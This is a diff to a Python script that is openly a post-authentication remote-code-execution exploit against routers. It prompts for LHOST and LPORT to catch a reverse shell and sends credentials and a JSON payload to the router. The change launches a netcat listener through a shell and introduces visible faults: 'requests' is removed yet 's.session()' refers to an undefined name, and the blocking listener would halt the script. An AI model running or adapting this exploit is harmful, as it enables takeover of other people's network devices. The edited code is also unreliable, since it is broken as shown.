@@ -1,6 +1,6 @@
 import os
-import requests
 import json
+import subprocess
 
 option = "0"
 
@@ -25,7 +25,7 @@ def runit():
 	elif option == "2":
 		exploit2()
 	else: print("You must select '1' or '2'. Exiting.")
-	
+     
 def exploit1():
     print("## Running Post Auth RCE exploit")
     print()
@@ -39,10 +39,7 @@ def exploit1():
 
     LHOST = input("## Enter the LHOST for the router reverse shell: ")
     LPORT = input("## Enter the LPORT for the router reverse shell: ")
-
-    nc1_str = f'!! Start a listener with the following command: nc -lvp {LPORT}'
-
-    input(nc1_str + "\n\nPress enter once you do")
+    subprocess.call("nc -lvp " + str(LPORT), shell=True)
 
     router_url = f'http://{router_ip}:{router_port}'
 
@@ -58,8 +55,7 @@ def send_json_payload(router_url, router_user, router_pass, lhost_ip, lhost_port
     
     payload_json = json.loads(payload_str)
 
-    s = requests.session()
-
+    s = s.session()
     s.auth = (router_user, router_pass)
 
     s.headers.update(
